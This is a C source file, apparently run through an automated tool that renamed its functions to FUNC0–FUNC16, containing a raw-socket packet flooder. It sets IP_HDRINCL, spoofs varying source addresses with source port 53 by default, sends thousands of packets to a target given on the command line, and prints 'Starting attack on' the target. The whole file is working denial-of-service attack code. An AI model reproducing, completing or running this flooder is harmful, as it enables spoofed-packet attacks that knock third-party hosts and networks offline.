#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */
typedef  int /*<<< orphan*/  time_t ;
typedef  int /*<<< orphan*/  on ;

/* Variables and functions */
 int /*<<< orphan*/  AF_INET ; 
 int /*<<< orphan*/  IPPROTO_IP ; 
 int /*<<< orphan*/  IPPROTO_RAW ; 
 int /*<<< orphan*/  IP_HDRINCL ; 
 int /*<<< orphan*/  SOCK_RAW ; 
 void* FUNC0 (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC1 (int) ; 
 int /*<<< orphan*/  FUNC2 (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC3 (int /*<<< orphan*/ ,char*,...) ; 
 int FUNC4 (int,char**,char*) ; 
 int FUNC5 () ; 
 scalar_t__ FUNC6 (int) ; 
 int /*<<< orphan*/  optarg ; 
 scalar_t__ optind ; 
 int /*<<< orphan*/  FUNC7 (char*) ; 
 unsigned long FUNC8 (char*) ; 
 int /*<<< orphan*/  FUNC9 (int,scalar_t__,unsigned long,unsigned short,unsigned short) ; 
 scalar_t__ FUNC10 (int,int /*<<< orphan*/ ,int /*<<< orphan*/ ,char*,int) ; 
 int FUNC11 (int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC12 (int) ; 
 int /*<<< orphan*/  stdout ; 
 int FUNC13 (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC14 () ; 
 int /*<<< orphan*/  FUNC15 (int) ; 

int FUNC16(int argc, char **argv)
{
	int sock;
	int on=1,i;
	unsigned long source, dest;
	unsigned short sport=53, dport=16384;
	int delay=20000, count=15000;

	if (argc<3)
		FUNC14();	

	while ((i=FUNC4(argc,argv,"s:d:n:u:"))!=-1)
	{
		switch (i)
		{
			case 's': sport=FUNC0(optarg);
				  break;
			case 'd': dport=FUNC0(optarg);
				  break;
			case 'n': count=FUNC0(optarg);
				  break;
			case 'u': delay=FUNC0(optarg);
				  break;
			default:  FUNC14();
		}
	}
	
	argc-=optind;
	argv+=optind;

	source=FUNC8(argv[0]);
        dest=FUNC8(argv[1]);

	FUNC12(FUNC13((time_t)0)*FUNC5());

	if( (sock = FUNC11(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0)
	{
		FUNC7("socket");
		FUNC1(1);
	}

	if (FUNC10(sock,IPPROTO_IP,IP_HDRINCL,(char *)&on,sizeof(on)) < 0)
	{
		FUNC7("setsockopt: IP_HDRINCL");
		FUNC1(1);
	}

	FUNC3(stdout,"\nStarting attack on %s ...",argv[1]);

	for (i=0; i<count; i++)
	{
		FUNC9(sock,source+FUNC6(i),dest,sport,dport);
		if (!(i%2))
			FUNC15(delay);
		if (!(i%100))
		{
			if (!(i%2000))
				FUNC3(stdout,"\n");
			FUNC3(stdout,".");
			FUNC2(stdout);
		}
	}

	FUNC3(stdout,"\nDone.\n");
	FUNC1(1);
}